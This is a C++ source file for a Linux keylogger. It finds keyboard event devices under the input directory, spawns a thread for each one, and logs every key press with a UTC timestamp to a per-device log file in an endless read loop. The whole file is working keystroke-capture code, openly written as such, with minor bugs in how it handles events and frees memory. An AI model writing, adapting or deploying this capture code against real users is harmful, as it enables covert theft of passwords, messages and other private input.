#include <string>
#include <fstream>
#include <regex>
#include <vector>
#include <cstdlib>
#include <ctime>
#include <iomanip>
#include <cstring>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <pthread.h>
#include <linux/input.h>
#include <linux/version.h>
#include <sys/ioctl.h>

#include "constants.hh"

static void* _startCapture(void* threadData);

static int _isEventDevice(const struct dirent *directory)
{
    return strncmp(EVENT_DEVICE_NAME.c_str(), directory->d_name, 5) == 0;
}

class Keyboard {

    public:
    std::string devicePath;
    std::string captureLog;
    int deviceFile;

    Keyboard() {
        deviceFile = -1;
    }

    ~Keyboard() {
        close(deviceFile);
    }

    void openDeviceFile() {
        deviceFile = open(devicePath.c_str(), O_RDONLY);
    }

    pthread_t getCaptureThread() {
        return _captureThread;
    }

    void capture() {
        pthread_create(&_captureThread, nullptr, _startCapture, (void *)this);
    }

    private:
    pthread_t _captureThread;
};

std::vector<Keyboard> findKeyboards()
{
    struct dirent **nameList;
    std::vector<Keyboard> keyboards;

    // Get number and list of devices in event device directory
    int numDevices = scandir(INPUT_DEVICE_DIR.c_str(), &nameList, _isEventDevice, versionsort);

    for (int i=0; i < numDevices; ++i) {
        std::string deviceName, devicePath;
        char deviceInfo[256];
        int deviceFile = -1;

        // Get path to event device and open it
        deviceName = nameList[i]->d_name;
        devicePath = INPUT_DEVICE_DIR + deviceName;
        deviceFile = open(devicePath.c_str(), O_RDONLY);

        if (deviceFile < 0) {
            continue;
        }

        // Get event device information
        ioctl(deviceFile, EVIOCGNAME(sizeof(deviceInfo)), deviceInfo);
        close(deviceFile);

        // If device description matches the regex pattern, push onto vector
        std::regex keyboardNamePattern(".*[Kk]eyboard.*");
        if (std::regex_match(deviceInfo, keyboardNamePattern)) {
            Keyboard keyboard;
            keyboard.devicePath = devicePath;
            keyboard.captureLog = deviceName + ".log";;
            keyboards.push_back(keyboard);
        }

        free(nameList[i]);
    }

    return keyboards;
}

static void* _startCapture(void* threadData)
{
    // Retrieve and cast Keyboard instance from threadData
    Keyboard *keyboard;
    keyboard = (Keyboard *) threadData;

    int readEvent;
    struct input_event keyEvent[64];

    // Open log file and keyboard device file
    std::ofstream logFileStream (keyboard->captureLog, std::ios::app);
    keyboard->openDeviceFile();

    if (keyboard->deviceFile > 0) {

        // Write timestamp
        std::time_t time = std::time(nullptr);
        logFileStream << "\n| UTC: " << std::put_time(std::gmtime(&time), "%c %Z") << " |\n"
            << "-------------------------------------\n";

        // Capture keystrokes (but not releases)
        while (1) {
            readEvent = read(keyboard->deviceFile, keyEvent, sizeof(struct input_event) * 64);
            if (keyEvent[1].value !=1) {
                logFileStream << keys[keyEvent[1].code] << std::endl;
            }
        }
    }

    pthread_exit(nullptr);
}
